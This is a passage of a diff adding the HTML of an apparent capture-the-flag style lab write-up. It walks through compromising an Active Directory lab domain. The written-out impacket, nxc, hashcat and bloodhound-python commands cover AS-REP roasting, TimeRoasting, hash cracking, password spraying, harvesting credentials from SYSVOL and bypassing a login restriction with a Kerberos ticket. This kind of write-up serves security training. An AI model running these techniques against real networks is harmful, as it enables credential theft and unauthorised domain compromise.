+          src="https://k40tik.github.io/posts/past-hacksmarter/guest-share-access_hu_e367622b22c519e1.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/guest-share-access_hu_71fa1ab17461185.png 330w,https://k40tik.github.io/posts/past-hacksmarter/guest-share-access_hu_e367622b22c519e1.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/guest-share-access.png 738w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/guest-share-access.png 738w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The share contained a list of machines in the environment, which I added to my hosts file for easier name resolution.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/past-hacksmarter/hosts-file-machines_hu_425c701be72ae4a5.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="514"
+        height="176"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/hosts-file-machines.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="as-rep-roasting" class="relative group">AS-REP Roasting <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#as-rep-roasting" aria-label="Anchor">#</a></span></h3><p>Using the discovered usernames, I attempted to perform AS-REP roasting. None of the accounts had Kerberos pre-authentication disabled, so the attack did not yield any hashes.</p>
+<pre tabindex="0"><code>impacket-GetNPUsers past.local/ -usersfile users.txt -no-pass -dc-ip 10.1.162.214
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes_hu_669d79c3784c6bee.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes_hu_5ec68791623ead35.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes_hu_e1334b2a7dff66c9.webp 822w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes_hu_e1334b2a7dff66c9.webp 822w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="822"
+        height="232"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes_hu_c2b026a993ab07bc.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes_hu_43a631f0de1e5575.png 330w,https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes_hu_c2b026a993ab07bc.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes.png 822w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/asrep-no-hashes.png 822w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="timeroasting" class="relative group">TimeRoasting <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#timeroasting" aria-label="Anchor">#</a></span></h3><p>At this point I did not have much to work with and had run into several rabbit holes during enumeration.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum_hu_c1b1ff5ebd0df202.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum_hu_bf24cd96c5badcad.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum_hu_d8dbd4238411a653.webp 958w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum_hu_d8dbd4238411a653.webp 958w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="958"
+        height="468"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum_hu_69f0dead8872066d.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum_hu_e2620fed38b17990.png 330w,https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum_hu_69f0dead8872066d.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum.png 958w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/rabbit-hole-enum.png 958w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I decided to try TimeRoasting against the domain, which harvests hashes from the <code>lastLogonTimestamp</code> attribute of computer accounts using the guest account.</p>
+<pre tabindex="0"><code>nxc smb 10.1.162.214 -u guest -p &#39;&#39; -M timeroast
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_cc32195d3fa68c4e.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_1558f67e7d0dc5d4.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_27f3b9de4914f6ee.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_cdefcc0b50b61ad.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1333"
+        height="214"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_2f6b9472a5886c48.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_da166efde1503e85.png 330w,https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_2f6b9472a5886c48.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_846a2da9e2e903b0.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/timeroast-module_hu_106ed30b27f54ed7.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I ran into some issues with John the Ripper while cracking the captured hashes, so I switched to Hashcat instead.</p>
+<pre tabindex="0"><code>hashcat -m 31300 hashes.txt --color-cracked
+</code></pre><p>Only one hash was successfully cracked.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked_hu_85ad4be47021ec7f.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked_hu_712efe2551cdc89a.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked_hu_75fc1e3e5b9abfec.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked_hu_f101dc2d7a9ccbdd.webp 1053w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1053"
+        height="189"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked_hu_4c37be44d184cd17.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked_hu_1985078c13139c01.png 330w,https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked_hu_4c37be44d184cd17.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked_hu_a34622ff8faf4752.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/hashcat-cracked.png 1053w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-2-initial-access" class="relative group">Step 2: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-initial-access" aria-label="Anchor">#</a></span></h2><h3 id="password-spraying" class="relative group">Password Spraying <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#password-spraying" aria-label="Anchor">#</a></span></h3><p>The cracked password belonged to a machine account. Spraying this password against the environment, I successfully authenticated to one machine. I also noted that one of the machines had login restrictions in place.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/password-spray_hu_c2b43a24583b0849.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/password-spray_hu_7a168399dbd81683.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/password-spray_hu_fc780795f3ff9867.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/password-spray_hu_a6fd4df6fc453294.webp 1028w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1028"
+        height="219"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/password-spray_hu_e9c73a6b8b0d71d2.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/password-spray_hu_4913f41e6f5f3da8.png 330w,https://k40tik.github.io/posts/past-hacksmarter/password-spray_hu_e9c73a6b8b0d71d2.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/password-spray_hu_bb36147b81018e47.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/password-spray.png 1028w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="sysvol-share" class="relative group">SYSVOL Share <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#sysvol-share" aria-label="Anchor">#</a></span></h3><p>Listing the shares with the machine account revealed that it has read access on the SYSVOL share.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing_hu_3c936cbdf0a42871.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing_hu_c544d8334c35d9a5.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing_hu_6e569e825feb1a87.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing_hu_c67a732b2f31caf5.webp 1059w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1059"
+        height="222"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing_hu_c2fe46b29da14ca1.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing_hu_6fbfb37de42dd1fe.png 330w,https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing_hu_c2fe46b29da14ca1.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing_hu_fc129ec8ea50ef43.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/machine-share-listing.png 1059w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access_hu_78e11bcce5a91d14.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access_hu_dbad161c1bed0d4a.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access_hu_c885a38fc201d98c.webp 857w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access_hu_c885a38fc201d98c.webp 857w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="857"
+        height="233"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access_hu_b05e3600a1c640cf.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access_hu_7be95123cf4c1bbe.png 330w,https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access_hu_b05e3600a1c640cf.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access.png 857w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/sysvol-read-access.png 857w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I accessed the SYSVOL share:</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access_hu_d7e1202a543a572e.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access_hu_d94a4b8b0ce1b559.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access_hu_9770140abd86c611.webp 805w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access_hu_9770140abd86c611.webp 805w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="805"
+        height="331"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access_hu_e63dd4b7cd4c520c.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access_hu_5fb9602ded9e2332.png 330w,https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access_hu_e63dd4b7cd4c520c.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access.png 805w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/sysvol-share-access.png 805w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Inside the scripts directory, a file contained user credentials for <code>tyler</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/past-hacksmarter/scripts-directory_hu_d96368aed7c79991.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="411"
+        height="83"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/scripts-directory.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found_hu_5bdab3eb34dbcaba.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found_hu_ec1cf153f3c7df53.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found_hu_9a642b6cd61b76af.webp 660w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found_hu_9a642b6cd61b76af.webp 660w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="660"
+        height="182"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found_hu_d66acfbbe7c902fc.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found_hu_43bfd8ab0a8d5a1e.png 330w,https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found_hu_d66acfbbe7c902fc.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found.png 660w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/tyler-creds-found.png 660w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I then authenticated with <code>tyler</code>&rsquo;s account using the newly obtained credentials.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/tyler-auth_hu_382663170148b7e0.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/tyler-auth_hu_2d9e631127fb03d8.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/tyler-auth_hu_a5f3e911d06e06d.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/tyler-auth_hu_7f4cbb4eed2d3a90.webp 1063w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1063"
+        height="88"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/tyler-auth_hu_49df0a9a541dcee7.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/tyler-auth_hu_377f5cc79e0719d1.png 330w,https://k40tik.github.io/posts/past-hacksmarter/tyler-auth_hu_49df0a9a541dcee7.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/tyler-auth_hu_9ca23fe92eedaa54.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/tyler-auth.png 1063w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-3-internal-enumeration-with-bloodhound" class="relative group">Step 3: Internal Enumeration with BloodHound <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-internal-enumeration-with-bloodhound" aria-label="Anchor">#</a></span></h2><p>To map out the domain, I performed a BloodHound collection using the compromised machine account.</p>
+<pre tabindex="0"><code>bloodhound-python -u &#39;APPDEV01$&#39; -p &#39;&lt;REDACTED&gt;&#39; -d past.local -ns 10.1.162.214 -c All
+</code></pre><p>From the BloodHound output, the machine account does not have any special privileges.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_5c836114380b3ec6.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_15b1945f5a6031fd.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_dc9b1e4b3fe890b7.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_a1467967c7c96951.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1411"
+        height="382"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_f4cb90fec380d2aa.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_7191031459a86aa.png 330w,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_f4cb90fec380d2aa.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_a4acd3c978af7840.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-no-privs_hu_7c5849304d077997.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Checking out <code>tyler</code>&rsquo;s account, which had login restrictions, I found that the user has outbound <strong>GenericAll</strong> control.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-restrictions_hu_c3afafe4a9a056b4.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="449"
+        height="308"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-restrictions.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall_hu_de4de63731b7ff87.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall_hu_c8562eea5b15be5e.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall_hu_57e97e835a51143d.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall_hu_8c7b2d1f8b691c5.webp 1109w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1109"
+        height="361"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall_hu_19743ed213fd5e9d.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall_hu_2c51f45f0354d0fd.png 330w,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall_hu_19743ed213fd5e9d.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall_hu_987ba9eab83f8f6c.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-tyler-genericall.png 1109w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The machine account holds DCSync rights over the domain, so if I could compromise it, it would be a clear path to Domain Admin.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_8cf7a52d56993777.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_676b0da847ff5807.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_b37b1d2ff427a54.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_b394fea1118c3ace.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1437"
+        height="537"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_d155c62f7989e6e1.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_e232bc12f5a43404.png 330w,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_d155c62f7989e6e1.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_fd1c04c4af6c90c7.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/bloodhound-machine-dcsync_hu_166e7dd84698b436.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-4-bypassing-the-login-restriction" class="relative group">Step 4: Bypassing the Login Restriction <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-bypassing-the-login-restriction" aria-label="Anchor">#</a></span></h2><p>Since there was no other way of bypassing the login restriction on <code>tyler</code>&rsquo;s account, I decided to authenticate using a Kerberos ticket instead of the standard password exchange.</p>
+<p>Requesting the ticket:</p>
+<pre tabindex="0"><code>impacket-getTGT past.local/&#39;tyler&#39;:&#39;&lt;REDACTED&gt;&#39; -dc-ip 10.1.162.214
+</code></pre><pre tabindex="0"><code>nxc smb 10.1.162.214 -u &#39;tyler&#39; -k --use-kcache
+</code></pre><p>This bypassed the restrictions and I authenticated successfully with Kerberos.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth_hu_29cb36c1b154a187.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth_hu_34d2c704671febec.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth_hu_9929bca5f1680ca1.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth_hu_68620a15a82e769.webp 1049w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1049"
+        height="257"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth_hu_44cc292da79d7dc2.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth_hu_4a3781c81dc5e72e.png 330w,https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth_hu_44cc292da79d7dc2.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth_hu_1dc35cab18600682.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/kerberos-ticket-auth.png 1049w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>A share listing showed that I have read/write access to the <code>C$</code> share, which stands out.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access_hu_b67b9e7370bd8d7e.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access_hu_95f02bb19e476f91.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access_hu_e6544c31c7fa2885.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access_hu_c77f63e6076280a8.webp 1053w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1053"
+        height="225"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access_hu_3cd828c6c09a9b6.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access_hu_4a0e90fb3456200e.png 330w,https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access_hu_3cd828c6c09a9b6.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access_hu_fee81f5959a17814.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/c-share-rw-access.png 1053w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
